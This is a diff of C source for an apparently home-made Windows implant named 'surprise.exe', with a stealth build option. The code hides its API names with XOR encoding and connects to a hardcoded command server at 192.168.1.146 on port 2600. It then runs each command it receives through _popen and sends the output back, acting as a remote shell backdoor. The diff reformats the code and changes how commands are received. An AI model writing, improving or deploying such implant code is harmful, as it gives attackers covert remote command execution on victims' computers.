@@ -1,14 +1,15 @@
 #include "implant.h"
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt
 // futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
-int main(){
-// Set variables
+int main()
+{
+    // Set variables
     char rcvbuffer[DEFAULT_BUFLEN];
     char sndbuffer[DEFAULT_BUFLEN];
-    char command[] = { 0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00 };
-    char s_kernel[] = { 0x20, 0x2E, 0x39, 0x25, 0x2E, 0x27, 0x78, 0x79, 0x65, 0x2F, 0x27, 0x27, 0x00 }; // kernel32.dll
-    char s_createproc[] = { 0x08, 0x39, 0x2E, 0x2A, 0x3F, 0x2E, 0x1B, 0x39, 0x24, 0x28, 0x2E, 0x38, 0x38, 0x0A, 0x00 }; // CreateProcessA
-    char s_ws2_32[] = { 0x3C, 0x38, 0x79, 0x14, 0x78, 0x79, 0x00 }; // ws2_32.dll
+    char command[] = {0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00};
+    char s_kernel[] = {0x20, 0x2E, 0x39, 0x25, 0x2E, 0x27, 0x78, 0x79, 0x65, 0x2F, 0x27, 0x27, 0x00};                 // kernel32.dll
+    char s_createproc[] = {0x08, 0x39, 0x2E, 0x2A, 0x3F, 0x2E, 0x1B, 0x39, 0x24, 0x28, 0x2E, 0x38, 0x38, 0x0A, 0x00}; // CreateProcessA
+    char s_ws2_32[] = {0x3C, 0x38, 0x79, 0x14, 0x78, 0x79, 0x00};                                                     // ws2_32.dll
     decode(command, 'K', 7);
     decode(s_kernel, 'K', sizeof(s_kernel) - 1);
     decode(s_createproc, 'K', sizeof(s_createproc) - 1);
@@ -18,9 +19,7 @@ int main(){
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
 
-
-
-    //AES initialisation
+    // AES initialisation
     BCRYPT_ALG_HANDLE aesAlgorithm = NULL;
     BCRYPT_KEY_HANDLE aesKey = NULL;
     BYTE *pbKeyObject = NULL;
@@ -29,12 +28,10 @@ int main(){
     NTSTATUS status;
     BYTE pbSecret[32]; // Replace with your AES key bytes (16, 24, or 32 bytes)
     BYTE tag[16];
-    
+
     ULONG cbSecret = sizeof(pbSecret);
-    BYTE nonce[12]; 
+    BYTE nonce[12];
 
-
-    
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
 
@@ -44,13 +41,10 @@ int main(){
     authInfo.cbTag = sizeof(tag);
 
     status = BCryptOpenAlgorithmProvider(&aesAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!BCRYPT_SUCCESS(status)) {
+    if (!BCRYPT_SUCCESS(status))
+    {
         return 0;
     }
-
-
-
-
 
     status = BCryptGenRandom(aesAlgorithm, pbSecret, cbSecret, 0);
     status = BCryptGenRandom(NULL, nonce, sizeof(nonce), 0);
@@ -59,9 +53,9 @@ int main(){
         BCRYPT_CHAINING_MODE,
         (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
         sizeof(BCRYPT_CHAIN_MODE_GCM),
-        0
-    );
-    if (!BCRYPT_SUCCESS(status)) {
+        0);
+    if (!BCRYPT_SUCCESS(status))
+    {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
@@ -72,18 +66,18 @@ int main(){
         (PUCHAR)&cbKeyObject,
         sizeof(cbKeyObject),
         &result,
-        0
-    );
-    if (!BCRYPT_SUCCESS(status)) {
+        0);
+    if (!BCRYPT_SUCCESS(status))
+    {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
 
-    //Allow memory
+    // Allow memory
     pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
 
-
-    if (pbKeyObject == NULL) {
+    if (pbKeyObject == NULL)
+    {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
@@ -95,20 +89,17 @@ int main(){
         cbKeyObject,
         pbSecret,
         cbSecret,
-        0
-    );
-    if (!BCRYPT_SUCCESS(status)) {
+        0);
+    if (!BCRYPT_SUCCESS(status))
+    {
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
 
-
-
-
-    
     HMODULE hWs2_32 = LoadLibraryA(s_ws2_32);
-    if (hWs2_32 == NULL) {
+    if (hWs2_32 == NULL)
+    {
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
@@ -116,7 +107,7 @@ int main(){
 
     char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
     char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
-    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00}; // connect
+    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};                      // connect
     decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
     decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
     decode(s_connect, 'K', sizeof(s_connect) - 1);
@@ -124,14 +115,16 @@ int main(){
     pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, s_WSAStartup);
     pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hWs2_32, s_WSASocketA);
     pConnect myConnect = (pConnect)GetProcAddress(hWs2_32, s_connect);
-    if (!myWSAStartup || !myWSASocket || !myConnect) {
+    if (!myWSAStartup || !myWSASocket || !myConnect)
+    {
         FreeLibrary(hWs2_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
         return 0;
     }
 
-    if (myWSAStartup(MAKEWORD(2,2), &wsa) != 0) {
+    if (myWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+    {
         FreeLibrary(hWs2_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
@@ -139,7 +132,8 @@ int main(){
     }
 
     SOCKET soc = myWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    if (soc == INVALID_SOCKET) {
+    if (soc == INVALID_SOCKET)
+    {
         WSACleanup();
         FreeLibrary(hWs2_32);
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
@@ -151,7 +145,8 @@ int main(){
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("192.168.1.146");
 
-    if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0) {
+    if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0)
+    {
         closesocket(soc);
         WSACleanup();
         FreeLibrary(hWs2_32);
@@ -160,76 +155,91 @@ int main(){
         return 0;
     }
 
-
     FILE *pipe;
     int kill = 1;
     int checker;
-    while (kill == 1){
-        checker = recv_all(soc, rcvbuffer, 512);
-    if (checker <= 0) return 1; //error in recv_all
-    
+    while (kill == 1)
+    {
+        checker = recv_all(soc, rcvbuffer, 4);
+        if (checker <= 0)
+            return 1; // error in recv_all
+        unsigned int cmdlen = (unsigned char)rcvbuffer[0] |
+                              ((unsigned char)rcvbuffer[1] << 8) |
+                              ((unsigned char)rcvbuffer[2] << 16) |
+                              ((unsigned char)rcvbuffer[3] << 24);
+        recv_all(soc, rcvbuffer, cmdlen);
+        rcvbuffer[cmdlen] = '\0';
 
+        if (rcvbuffer[0] == '#')
+            kill = 0; // kill program if serveur say #
+        else
+        {
+            pipe = _popen(rcvbuffer, "r");
+            char buf[512];
 
-
-    if(rcvbuffer[0] == '#') kill = 0; //kill program if serveur say #
-    else {
-        pipe = _popen(rcvbuffer, "r");
-        char buf[512];
-
-        while (fgets(buf, sizeof(buf), pipe) != NULL) {
-        send_all(soc, buf, (int)strlen(buf));
+            while (fgets(buf, sizeof(buf), pipe) != NULL)
+            {
+                send_all(soc, buf, (int)strlen(buf));
+            }
+            if (pipe != NULL)
+            {
+                _pclose(pipe);
+            }
+        }
     }
-    }
-    }
-    
 
-
-
-
-// cleanup
+    // cleanup
     closesocket(soc);
     WSACleanup();
-    if (aesKey) {
+    if (aesKey)
+    {
         BCryptDestroyKey(aesKey);
     }
-    if (pbKeyObject) {
+    if (pbKeyObject)
+    {
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
     }
-    if (aesAlgorithm) {
+    if (aesAlgorithm)
+    {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
     }
     _pclose(pipe);
     return 0;
 }
 
-
-char* decode(char* message, char key, int lenght){
-    for (int i = 0; i < lenght; i++){
+char *decode(char *message, char key, int lenght)
+{
+    for (int i = 0; i < lenght; i++)
+    {
         message[i] = message[i] ^ key;
     }
     return message;
 }
 
-int recv_all(SOCKET sock,char *buff,int len){
+int recv_all(SOCKET sock, char *buff, int len)
+{
     int received = 0;
     int total = 0;
-    while(total < len){
+    while (total < len)
+    {
         received = recv(sock, buff + total, len - total, 0);
-        if (received <= 0) return received;
+        if (received <= 0)
+            return received;
         total += received;
     }
     return total;
 }
 
-int send_all(SOCKET sock,char *buff,int len){
+int send_all(SOCKET sock, char *buff, int len)
+{
     int sent = 0;
     int total = 0;
-    while(total < len){
+    while (total < len)
+    {
         sent = send(sock, buff + total, len - total, 0);
-        if (sent <= 0) return sent;
+        if (sent <= 0)
+            return sent;
         total += sent;
     }
     return total;
 }
-
-
